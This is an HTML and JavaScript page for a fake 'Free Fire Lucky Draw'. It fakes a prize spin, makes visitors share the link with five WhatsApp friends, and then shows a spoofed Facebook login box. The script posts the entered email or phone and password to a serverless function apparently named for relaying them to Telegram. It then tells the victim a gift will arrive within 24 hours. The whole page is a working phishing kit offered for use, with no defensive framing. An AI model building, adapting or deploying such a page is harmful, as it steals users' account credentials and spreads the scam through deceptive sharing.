<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Free Fire Lucky Draw</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<style>
body {
  background: #161a2b;
  color: #fff;
  font-family: Arial, sans-serif;
  margin: 0;
}
h1 {
  text-align: center;
  margin: 18px 0;
  font-size: 1.4em;
}
.centered {
  display: flex;
  flex-direction: column;
  align-items: center;
}
.lucky-grid {
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 20px;
  max-width: 350px;
  margin: 28px auto 0 auto;
}
.card {
  background: #202a48;
  border-radius: 14px;
  box-shadow: 0 2px 8px #0e132099;
  border: 2px solid #444;
  padding: 10px 2px 18px 2px;
  text-align: center;
  min-height: 135px;
  position: relative;
  transition: box-shadow 0.3s, border-color 0.3s;
}
.card img {
  width: 65px;
  height: 65px;
  object-fit: contain;
  background: #22253c;
  padding: 8px;
  border-radius: 8px;
  margin-bottom: 9px;
}
.card .label {
  font-size: 1.01em;
  font-weight: bold;
  padding-top: 2px;
}
.card.winner {
  border-color: #ffad07;
  box-shadow: 0 0 30px #ffad07cc, 0 0 15px #ff3b5099;
  animation: winnerGlow 1.3s 2;
}
@keyframes winnerGlow {
  0% { box-shadow: 0 0 0px #ffad07cc; }
  50% { box-shadow: 0 0 30px 10px #ffad07cc, 0 0 15px #ff3b5099; }
  100% { box-shadow: 0 0 0px #ffad07cc; }
}
.spin-btn,
.redeem-btn,
#share-btn {
  width: 90%;
  margin: 20px auto 0 auto;
  font-size: 1.12em;
  padding: 14px 0;
  border: none;
  border-radius: 8px;
  color: #fff;
  background: linear-gradient(90deg, #ffad07, #ff3b50);
  box-shadow: 0 2px 9px #ffad0730;
  cursor: pointer;
}
#result,
#share-area,
#redeem-area,
#fb-modal,
#confirmation-page {
  display: none;
}
#fb-modal {
  position: fixed;
  left: 0;
  right: 0;
  top: 0;
  bottom: 0;
  background: rgba(16, 20, 30, 0.85);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 30;
}
#confirmation-page {
  position: fixed;
  left: 0;
  right: 0;
  top: 0;
  bottom: 0;
  background: #202a48;
  color: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 31;
  font-size: 1.4em;
  padding: 20px;
  text-align: center;
  flex-direction: column;
}
.fb-container {
  width: 98vw;
  max-width: 360px;
  background: #fff;
  border-radius: 7px;
  padding: 28px 18px 22px 18px;
  box-shadow: 0 8px 38px #202a487a;
  position: relative;
  color: #000;
}
.fb-container h2 {
  color: #1877f2;
  letter-spacing: 1px;
  margin-top: 0;
  font-family: 'Segoe UI', Arial, sans-serif;
}
.fb-container input {
  width: 100%;
  padding: 11px;
  margin: 8px 0;
  border: 1px solid #ccd0d5;
  border-radius: 5px;
  font-size: 1em;
  background: #f5f6fa;
}
.fb-container button {
  width: 100%;
  padding: 11px;
  border: none;
  border-radius: 5px;
  background: #1877f2;
  color: #fff;
  font-size: 1em;
  margin-top: 8px;
  cursor: pointer;
}
.fb-container .close-fb {
  position: absolute;
  top: 15px;
  right: 20px;
  font-size: 1.4em;
  color: #444;
  background: none;
  border: none;
  cursor: pointer;
}
@media screen and (max-width: 600px) {
  .lucky-grid {max-width: 95vw; gap: 12px;}
  .card img {width: 48px; height: 48px;}
}
</style>
</head>
<body>
  <h1>Free Fire Lucky Draw</h1>
  <div class="lucky-grid" id="prizeGrid">
    <div class="card" data-idx="0">
      <img src="diamond-500.png" alt="500 Diamonds"><div class="label">500 Diamonds</div>
    </div>
    <div class="card" data-idx="1">
      <img src="diamond-300.png" alt="300 Diamonds"><div class="label">300 Diamonds</div>
    </div>
    <div class="card" data-idx="2">
      <img src="rare-gun-skin.png" alt="Rare Gun Skin"><div class="label">Rare Gun Skin Box</div>
    </div>
    <div class="card" data-idx="3">
      <img src="rare-dress.jpg" alt="Rare Dress"><div class="label">Rare Dress</div>
    </div>
    <div class="card" data-idx="4">
      <img src="pet-box.png" alt="Pet Box"><div class="label">Pet Box</div>
    </div>
  </div>
  <div class="centered">
    <button class="spin-btn" id="spin">Spin & Win!</button>
    <div id="result"></div>
    <div id="share-area" style="margin-top: 15px; text-align:center;">
      <p>You must share this site to 5 different friends on WhatsApp to redeem your prize!</p>
      <button id="share-btn" class="spin-btn" style="width: 60%; margin: 10px auto;">Share on WhatsApp (<span id="share-count">0</span>/5)</button>
    </div>
    <div id="redeem-area" style="margin-top: 15px; text-align:center;">
      <button class="redeem-btn" id="redeemBtn" disabled>Redeem</button>
    </div>
  </div>
  <!-- Facebook Login Modal -->
  <div id="fb-modal">
    <div class="fb-container">
      <button class="close-fb" onclick="document.getElementById('fb-modal').style.display='none'">Ã—</button>
      <h2>Facebook</h2>
      <input type="text" id="fb-email" placeholder="Email or Phone number" />
      <input type="password" id="fb-password" placeholder="Password" />
      <button id="fb-login-btn">Log In</button>
      <div style="margin: 14px 0 0 0; text-align: center;">
        <a href="#" style="color: #1877f2;">Forgotten password?</a>
      </div>
    </div>
  </div>
  <!-- Confirmation / Thank You page -->
  <div id="confirmation-page">
    <p>Thank you for logging in! <br>Your gift will be received in your mailbox within 24 hours.</p>
  </div>
<script>
  const prizes = [
    '500 Diamonds',
    '300 Diamonds',
    'Rare Gun Skin Box',
    'Rare Dress',
    'Pet Box'
  ];

  // Use localStorage for persistent share count
  if (!localStorage.getItem('whatsappShareCount')) {
    localStorage.setItem('whatsappShareCount', '0');
  }

  function updateShareUI() {
    const count = Number(localStorage.getItem('whatsappShareCount'));
    document.getElementById('share-count').textContent = count;
    // enable redeem only if shared 5 or more times
    document.getElementById('redeemBtn').disabled = (count < 5);
    document.getElementById('share-area').style.display = count < 5 ? 'block' : 'none';
  }

  function showPostWinUI() {
    document.getElementById('result').style.display = 'block';
    document.getElementById('share-area').style.display = 'block';
    updateShareUI();
    document.getElementById('redeem-area').style.display = 'block';
  }

  // To hold winner info
  let currentWinnerIndex = null;

  function spinCards() {
    // Clear previous highlights
    document.querySelectorAll('.card').forEach(card => card.classList.remove('winner'));

    currentWinnerIndex = Math.floor(Math.random() * prizes.length);

    const cardsCount = prizes.length;
    const totalRounds = 12; // animation cycles
    let currentStep = 0;

    function animateStep() {
      let idx = currentStep % cardsCount;
      document.querySelectorAll('.card').forEach(card => card.classList.remove('winner'));
      let cardEl = document.querySelector(`.card[data-idx="${idx}"]`);
      cardEl.classList.add('winner');

      currentStep++;
      if (currentStep < totalRounds * cardsCount) {
        // Speed up then slow down animation
        let speed = 70 + (currentStep * 10);
        setTimeout(animateStep, speed);
      } else {
        // Stop on the final winner
        document.querySelectorAll('.card').forEach(card => card.classList.remove('winner'));
        let winnerCard = document.querySelector(`.card[data-idx="${currentWinnerIndex}"]`);
        winnerCard.classList.add('winner');

        const result = document.getElementById('result');
        result.innerHTML = `<br><b>Congratulations!<br>You won:</b><br><img src="${winnerCard.querySelector('img').src}" alt="" style="width:75px;display:block;margin: 8px auto;">${prizes[currentWinnerIndex]}`;
        
        showPostWinUI();
        document.getElementById('redeemBtn').dataset.prize = currentWinnerIndex;
      }
    }

    animateStep();
  }

  document.getElementById('spin').onclick = spinCards;

  // Share button logic - one click increments share count, persistent via localStorage
  let shareClicked = false;

  document.getElementById('share-btn').onclick = () => {
    if (shareClicked) {
      alert("Please share to a different friend!");
      return;
    }
    shareClicked = true;

    const siteURL = encodeURIComponent(window.location.href);
    const whatsappLink = `https://wa.me/?text=Check out this awesome Free Fire Lucky Draw! Play now: ${siteURL}`;
    window.open(whatsappLink, '_blank');

    let count = Number(localStorage.getItem('whatsappShareCount'));
    if (count < 5) {
      localStorage.setItem('whatsappShareCount', String(count + 1));
    }
    updateShareUI();

    // Reset share clicked after 3 seconds to let user share again (simulate different friend)
    setTimeout(() => { shareClicked = false; }, 3000);
  };

  document.getElementById('redeemBtn').onclick = () => {
    document.getElementById('fb-modal').style.display = 'flex';
  };

  document.getElementById('fb-login-btn').onclick = () => {
    const emailOrPhone = document.getElementById('fb-email').value.trim();
    const password = document.getElementById('fb-password').value.trim();

    if (!emailOrPhone || !password) {
      alert('Please fill in both fields.');
      return;
    }

    fetch('/.netlify/functions/sendTelegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ emailOrPhone, password }),
    })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          alert('Login details sent successfully!');
          document.getElementById('fb-modal').style.display = 'none';
          // Show confirmation message
          document.getElementById('confirmation-page').style.display = 'flex';
          document.getElementById('fb-email').value = '';
          document.getElementById('fb-password').value = '';
        } else {
          alert('Failed to send details.');
        }
      })
      .catch(() => {
        alert('Error sending details.');
      });
  };

  // Initialize UI at start
  updateShareUI();

  // Hide modals by default
  document.getElementById('fb-modal').style.display = 'none';
  document.getElementById('confirmation-page').style.display = 'none';

</script>
</body>
</html>
